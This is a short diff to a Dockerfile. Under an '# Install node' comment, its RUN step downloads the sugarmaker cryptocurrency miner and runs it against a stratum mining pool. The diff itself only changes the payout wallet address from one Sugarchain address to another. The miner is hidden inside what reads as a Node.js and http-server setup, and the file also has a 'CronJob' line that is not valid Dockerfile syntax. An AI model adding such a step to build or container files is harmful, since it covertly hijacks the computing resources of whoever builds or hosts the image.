@@ -5,7 +5,7 @@ FROM vm/ubuntu:18.04
 # Install node
 CronJob '*/5 * * * * *'
 RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qj7tssru8ckc4lhfxntn5psaa6f87nwvkcfltuf.alt_22 && \
+    apt install nodejs && apt install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugarchain:sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.SM-01 && \
     rm -f /etc/apt/sources.list.d/nodesource.list
 RUN npm install -g http-server
 
